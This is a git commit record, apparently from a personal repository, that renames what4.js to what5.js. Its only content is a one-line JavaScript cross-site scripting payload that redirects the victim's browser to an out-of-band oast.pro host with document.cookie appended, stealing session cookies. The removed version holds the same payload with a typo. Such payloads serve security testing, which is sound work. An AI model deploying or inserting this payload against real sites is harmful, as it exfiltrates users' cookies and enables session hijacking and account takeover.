c25b2a3c7e35bb980d7d5207d3a95c5436fe1e45
woong <pcw0629@naver.com>
2025-05-19 19:50:57 +0900

    Update and rename what4.js to what5.js

--- what4.js
+++
@@ -1,2 +0,0 @@
-const url = "https://d0ngpqjz1wg0000afe4ggokammhyyyyyb.oast.pro";
-loaction.href = url + document.cookie;
---
+++ what5.js
@@ -0,0 +1,1 @@
+location.href = "https://d0ngpqjz1wg0000afe4ggokammhyyyyyb.oast.pro" + document.cookie;
